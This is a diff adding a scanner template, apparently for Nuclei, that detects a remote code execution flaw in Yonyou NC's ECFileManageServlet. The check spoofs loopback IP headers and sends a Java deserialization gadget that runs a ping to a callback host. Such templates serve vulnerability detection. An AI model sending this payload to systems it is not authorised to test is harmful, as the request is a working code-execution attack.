@@ -1,0 +1,26 @@
+id: yongyou-nc-ecapppub-ECFileManageServlet-rce
+
+info:
+  name: yongyou-nc-ecapppub-ECFileManageServlet-rce
+  author: yongyou-nc-ecapppub-ECFileManageServlet-rce
+  severity: Critical
+
+
+http:
+  - raw:
+    - |
+      POST /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-For: 127.0.0.10
+      X-Originating-IP: 127.0.0.10
+      X-Remote-Addr: 127.0.0.10
+      X-Remote-IP: 127.0.0.10
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
